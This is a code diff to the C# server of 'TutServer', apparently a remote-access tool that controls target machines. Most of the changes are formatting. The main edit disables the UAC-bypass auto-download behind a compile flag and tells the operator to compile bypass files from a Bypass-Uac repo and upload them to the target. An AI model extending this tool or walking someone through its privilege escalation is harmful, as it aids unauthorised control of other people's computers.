@@ -310,10 +310,12 @@ namespace TutServer //Main Namespace
         /// Plugin host object
         /// </summary>
         ScriptHost sh;
+#if EnableAutoLoad
         /// <summary>
         /// Indicates the progress of auto load function
         /// </summary>
         private int autoLoadProgress = 0;
+#endif 
 
         /// <summary>
         /// Crypto exception handling flag
@@ -332,9 +334,9 @@ namespace TutServer //Main Namespace
         /// </summary>
         private object TSLockObject = new object();
 
-        #endregion
+#endregion
 
-        #region Inner Classes
+#region Inner Classes
 
         /// <summary>
         /// Module providing connection with linux clients
@@ -782,9 +784,9 @@ namespace TutServer //Main Namespace
             }
         }
 
-        #endregion
+#endregion
 
-        #region Cross Bridge Functions
+#region Cross Bridge Functions
 
         /// <summary>
         /// Show local input box
@@ -1537,9 +1539,9 @@ namespace TutServer //Main Namespace
             return richTextBox2.Text; //Return all output text
         }
 
-        #endregion
+#endregion
 
-        #region Form and Server Functions
+#region Form and Server Functions
 
         /// <summary>
         /// Constructor
@@ -2646,9 +2648,9 @@ namespace TutServer //Main Namespace
                     if (text == "uac§f_admin") //Client sent that UAC bypass core files are missing
                     {
                         EnableButton(button20, true); //Enable Auto download
-                        Msgbox("Error!", "UAC Bypass Core files not found!\r\nYou can download them by pressing autoload!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
+                        Msgbox("Error!", "UAC Bypass Core files not found!\r\nDownload and Compile them manually from the Bypass-Uac repo\r\nThen upload them to the target", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
                     }
-
+#if EnableAutoLoad
                     if (text.StartsWith("uacload§")) //Client sent auto download progress
                     {
                         string progress = text.Split('§')[1]; //Get the progression
@@ -2667,6 +2669,7 @@ namespace TutServer //Main Namespace
                             Msgbox("Download Complete!", "Core files downloaded, you may retry bypassing UAC now", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notfiy the user
                         }
                     }
+#endif
                 }
             }
            
@@ -2675,9 +2678,9 @@ namespace TutServer //Main Namespace
 
 	    }
 
-        #endregion
+#endregion
 
-        #region Cross Thread Functions
+#region Cross Thread Functions
 
         /// <summary>
         /// Delegate used to set the remote desktop frame image
@@ -3515,9 +3518,9 @@ namespace TutServer //Main Namespace
             }
         }
 
-        #endregion
+#endregion
 
-        #region Route Window Function
+#region Route Window Function
 
         /// <summary>
         /// Event handler for handling a removed tool strip item with route window
@@ -3918,9 +3921,9 @@ namespace TutServer //Main Namespace
             rw.RoutePage(); //Route the page
         }
 
-        #endregion
+#endregion
 
-        #region UI Event Handlers
+#region UI Event Handlers
 
         /// <summary>
         /// Start / Stop The server listener
@@ -5568,10 +5571,12 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button20_Click(object sender, EventArgs e)
         {
+#if EnableAutoLoad
             SendToTarget("uacload"); //Send the command to the client
             progressBar1.Show(); //Show the progressbar
             label36.Show(); //Show the status label
             label36.Text = "0%"; //Set the label to 0%
+#endif
         }
 
         /// <summary>
@@ -5611,10 +5616,10 @@ namespace TutServer //Main Namespace
             }
         }
 
-        #endregion
+#endregion
     }
 
-    #region Outer Classes
+#region Outer Classes
 
     /// <summary>
     /// Audio playback class
@@ -6416,5 +6421,5 @@ namespace TutServer //Main Namespace
         }
     }
 
-    #endregion
+#endregion
 }
